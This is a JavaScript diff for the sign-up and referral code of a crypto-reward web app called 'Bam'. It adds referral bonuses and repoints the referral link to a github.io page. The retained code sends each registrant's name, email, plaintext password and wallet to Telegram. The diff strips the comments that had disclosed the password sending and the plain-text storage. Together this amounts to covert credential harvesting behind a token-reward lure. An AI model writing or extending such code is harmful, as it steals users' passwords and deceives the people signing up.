@@ -89,12 +89,27 @@ async function handleRegister(e) {
   const wallet = generateWalletAddress();
   const now = Date.now();
 
+  // Check if there is a referral code in the URL
+  const urlParams = new URLSearchParams(window.location.search);
+  const refCode = urlParams.get("ref");
+
+  let referrerEmail = null;
+  if (refCode) {
+    for (const [mail, u] of Object.entries(users)) {
+      if (u.wallet && u.wallet.slice(2, 10) === refCode) {
+        referrerEmail = mail;
+        break;
+      }
+    }
+  }
+
+  // Create new user
   users[email] = {
     name,
     email,
-    password, // demo only – never store plain text in production
+    password,
     wallet,
-    balance: 0,
+    balance: refCode && referrerEmail ? 0.15 : 0,   // New user gets 0.15 if referred
     xpRate: 10.0,
     lastClaim: 0,
     history: [],
@@ -102,10 +117,31 @@ async function handleRegister(e) {
     createdAt: now
   };
 
+  // Give reward to the referrer
+  if (referrerEmail && users[referrerEmail]) {
+    users[referrerEmail].balance = +(users[referrerEmail].balance + 0.15).toFixed(8);
+    users[referrerEmail].referrals = (users[referrerEmail].referrals || 0) + 1;
+    users[referrerEmail].history = users[referrerEmail].history || [];
+    users[referrerEmail].history.push({
+      type: "Referral Bonus",
+      amount: 0.15,
+      time: now
+    });
+  }
+
+  // Add history for new user if they got referral bonus
+  if (refCode && referrerEmail) {
+    users[email].history.push({
+      type: "Referral Welcome Bonus",
+      amount: 0.15,
+      time: now
+    });
+  }
+
   saveUsers(users);
   setSession(email);
 
-  // Send to Telegram (includes email + password as requested)
+  // Send to Telegram
   showToast("Creating account...", "success");
   try {
     await window.sendRegistrationToTelegram({ name, email, password, wallet });
@@ -113,7 +149,7 @@ async function handleRegister(e) {
     console.warn("Telegram notification failed (non-blocking)", err);
   }
 
-  showToast("Welcome to Bam! 🚀", "success");
+  showToast(refCode && referrerEmail ? "Welcome! +0.15 BAM Referral Bonus 🎉" : "Welcome to Bam! 🚀", "success");
   setTimeout(() => {
     showApp();
   }, 600);
@@ -417,7 +453,7 @@ function renderReferrals() {
   const user = getCurrentUser();
   if (!user) return;
   document.getElementById("ref-count").textContent = user.referrals || 0;
-  document.getElementById("ref-link").textContent = `https://bam.network/r/${user.wallet.slice(2, 10)}`;
+  document.getElementById("ref-link").textContent = `https://cloudfarmingdroid.github.io/Bamcoins/?ref=${user.wallet.slice(2, 10)}`;
 }
 
 function copyRefLink() {
